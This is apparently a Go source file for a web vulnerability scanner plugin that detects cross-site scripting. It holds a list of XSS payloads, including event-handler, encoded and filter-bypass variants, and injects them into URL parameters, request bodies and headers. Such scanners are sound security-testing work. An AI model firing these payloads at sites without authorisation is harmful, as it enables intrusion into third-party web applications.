package plugins

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"hackmitm-desktop/internal/activescan"
)

// XSSPlugin detects Cross-Site Scripting vulnerabilities
type XSSPlugin struct {
	*BasePlugin
}

// NewXSSPlugin creates a new XSS detection plugin
func NewXSSPlugin() *XSSPlugin {
	payloads := []string{
		// Basic script tags
		"<script>alert('XSS')</script>",
		"<script>alert(1)</script>",
		"<script>alert(document.domain)</script>",
		"<script>print()</script>",
		// Event handlers
		"<img src=x onerror=alert(1)>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert(1)>",
		"<svg/onload=alert(1)>",
		"<body onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<select onfocus=alert(1) autofocus>",
		"<textarea onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		// JavaScript protocol
		"javascript:alert(1)",
		"javascript:alert('XSS')",
		"JaVaScRiPt:alert(1)",
		"javascript:alert(document.domain)",
		// Data URI
		"<a href=\"data:text/html,<script>alert(1)</script>\">click</a>",
		// Encoded variants
		"%3Cscript%3Ealert(1)%3C/script%3E",
		"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
		// Filter bypass
		"<ScRiPt>alert(1)</ScRiPt>",
		"<SCRIPT>alert(1)</SCRIPT>",
		"<script/src=data:,alert(1)>",
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"'\"><script>alert(1)</script>",
		"'\"><img src=x onerror=alert(1)>",
		// Template injection
		"{{constructor.constructor('alert(1)')()}}",
		"${alert(1)}",
		// Angular template injection
		"{{constructor.constructor('alert(1)')()}}",
	}

	return &XSSPlugin{
		BasePlugin: NewBasePlugin(
			"XSS",
			"Cross-Site Scripting",
			"Detects reflected and stored XSS vulnerabilities",
			activescan.SeverityHigh,
			payloads,
		),
	}
}

// Scan performs XSS testing on the target
func (p *XSSPlugin) Scan(target *activescan.Target, client *http.Client, config *activescan.ScanConfig) ([]*activescan.Finding, error) {
	var findings []*activescan.Finding

	// Test URL parameters
	for _, payload := range p.Payloads() {
		f := p.testInURL(target, client, config, payload)
		if f != nil {
			findings = append(findings, f)
		}
	}

	// Test body parameters
	for _, payload := range p.Payloads() {
		f := p.testInBody(target, client, config, payload)
		if f != nil {
			findings = append(findings, f)
		}
	}

	// Test headers
	for _, payload := range p.Payloads() {
		f := p.testInHeaders(target, client, config, payload)
		if f != nil {
			findings = append(findings, f)
		}
	}

	return findings, nil
}

func (p *XSSPlugin) testInURL(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string) *activescan.Finding {
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	query := parsedURL.Query()
	for param := range query {
		originalValue := query.Get(param)
		query.Set(param, originalValue+payload)
		parsedURL.RawQuery = query.Encode()

		_, body, err := SendRequest(client, target.Method, parsedURL.String(), target.Headers, nil)
		if err != nil {
			query.Set(param, originalValue)
			continue
		}

		// Check if payload is reflected in response
		if p.isPayloadReflected(body, payload) {
			// Check if context allows execution
			context := p.getXSSContext(body, payload)
			confidence := p.calculateConfidence(body, payload, context)

			if confidence >= 50 {
				request := fmt.Sprintf("%s %s\nPayload: %s -> %s", target.Method, parsedURL.String(), param, payload)
				finding := CreateFinding(p.BasePlugin, target, payload, fmt.Sprintf("XSS payload reflected in %s context", context), request, body)
				finding.Confidence = confidence
				return finding
			}
		}

		query.Set(param, originalValue)
	}

	return nil
}

func (p *XSSPlugin) testInBody(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string) *activescan.Finding {
	if target.Method == "GET" || target.Body == "" {
		return nil
	}

	contentType := ""
	for k, v := range target.Headers {
		if strings.ToLower(k) == "content-type" {
			contentType = v
			break
		}
	}

	if strings.Contains(contentType, "application/x-www-form-urlencoded") {
		formData, err := url.ParseQuery(target.Body)
		if err != nil {
			return nil
		}

		for param := range formData {
			originalValue := formData.Get(param)
			formData.Set(param, originalValue+payload)

			_, body, err := SendRequest(client, target.Method, target.URL, target.Headers, []byte(formData.Encode()))
			if err != nil {
				formData.Set(param, originalValue)
				continue
			}

			if p.isPayloadReflected(body, payload) {
				context := p.getXSSContext(body, payload)
				confidence := p.calculateConfidence(body, payload, context)

				if confidence >= 50 {
					request := fmt.Sprintf("%s %s\nBody: %s", target.Method, target.URL, formData.Encode())
					finding := CreateFinding(p.BasePlugin, target, payload, fmt.Sprintf("XSS payload reflected in %s context", context), request, body)
					finding.Confidence = confidence
					return finding
				}
			}

			formData.Set(param, originalValue)
		}
	}

	// Test JSON body
	if strings.Contains(contentType, "application/json") {
		// Inject into JSON values
		modifiedBody := strings.ReplaceAll(target.Body, ":", ":\""+payload+"\",")
		modifiedBody = strings.ReplaceAll(modifiedBody, "\",\",", "\",")

		_, body, err := SendRequest(client, target.Method, target.URL, target.Headers, []byte(modifiedBody))
		if err == nil && p.isPayloadReflected(body, payload) {
			context := p.getXSSContext(body, payload)
			confidence := p.calculateConfidence(body, payload, context)

			if confidence >= 50 {
				request := fmt.Sprintf("%s %s\nBody: %s", target.Method, target.URL, modifiedBody)
				finding := CreateFinding(p.BasePlugin, target, payload, fmt.Sprintf("XSS payload reflected in %s context", context), request, body)
				finding.Confidence = confidence
				return finding
			}
		}
	}

	return nil
}

func (p *XSSPlugin) testInHeaders(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string) *activescan.Finding {
	// Test common headers that might be reflected
	testHeaders := []string{"X-Forwarded-For", "X-Original-URL", "User-Agent", "Referer"}

	for _, header := range testHeaders {
		modifiedHeaders := make(map[string]string)
		for k, v := range target.Headers {
			modifiedHeaders[k] = v
		}
		modifiedHeaders[header] = payload

		_, body, err := SendRequest(client, target.Method, target.URL, modifiedHeaders, []byte(target.Body))
		if err != nil {
			continue
		}

		if p.isPayloadReflected(body, payload) {
			context := p.getXSSContext(body, payload)
			confidence := p.calculateConfidence(body, payload, context)

			if confidence >= 50 {
				request := fmt.Sprintf("%s %s\nHeader: %s: %s", target.Method, target.URL, header, payload)
				finding := CreateFinding(p.BasePlugin, target, payload, fmt.Sprintf("XSS payload reflected in %s context via header", context), request, body)
				finding.Confidence = confidence
				return finding
			}
		}
	}

	return nil
}

func (p *XSSPlugin) isPayloadReflected(body, payload string) bool {
	// Check for exact match
	if strings.Contains(body, payload) {
		return true
	}

	// Check for case-insensitive match
	if strings.Contains(strings.ToLower(body), strings.ToLower(payload)) {
		return true
	}

	// Check for URL-decoded payload
	decodedPayload, err := url.QueryUnescape(payload)
	if err == nil && strings.Contains(body, decodedPayload) {
		return true
	}

	// Check for HTML-decoded payload
	if strings.Contains(body, unescapeHTML(payload)) {
		return true
	}

	return false
}

func (p *XSSPlugin) getXSSContext(body, payload string) string {
	idx := strings.Index(body, payload)
	if idx == -1 {
		idx = strings.Index(strings.ToLower(body), strings.ToLower(payload))
	}
	if idx == -1 {
		return "unknown"
	}

	// Get context around the payload
	start := idx
	if start > 50 {
		start = idx - 50
	}
	end := idx + len(payload) + 50
	if end > len(body) {
		end = len(body)
	}

	context := body[start:end]

	// Determine the context
	if strings.Contains(context, "<script") {
		return "script"
	}
	if strings.Contains(context, "href=\"") || strings.Contains(context, "src=\"") {
		return "attribute"
	}
	if strings.Contains(context, "=\"") && strings.Contains(context, "\"") {
		return "attribute"
	}
	if strings.Contains(context, "<") && !strings.Contains(payload, "<") {
		return "html"
	}

	return "text"
}

func (p *XSSPlugin) calculateConfidence(body, payload, context string) int {
	confidence := 50 // Base confidence

	// Increase confidence for dangerous contexts
	switch context {
	case "script":
		confidence += 30
	case "attribute":
		confidence += 20
	case "html":
		confidence += 10
	}

	// Increase confidence for payloads that are likely to execute
	if strings.Contains(payload, "<script") {
		confidence += 10
	}
	if strings.Contains(payload, "onerror=") || strings.Contains(payload, "onload=") {
		confidence += 10
	}
	if strings.Contains(payload, "javascript:") {
		confidence += 10
	}

	// Cap at 100
	if confidence > 100 {
		confidence = 100
	}

	return confidence
}

func unescapeHTML(s string) string {
	s = strings.ReplaceAll(s, "&lt;", "<")
	s = strings.ReplaceAll(s, "&gt;", ">")
	s = strings.ReplaceAll(s, "&quot;", "\"")
	s = strings.ReplaceAll(s, "&#x3C;", "<")
	s = strings.ReplaceAll(s, "&#x3E;", ">")
	return s
}
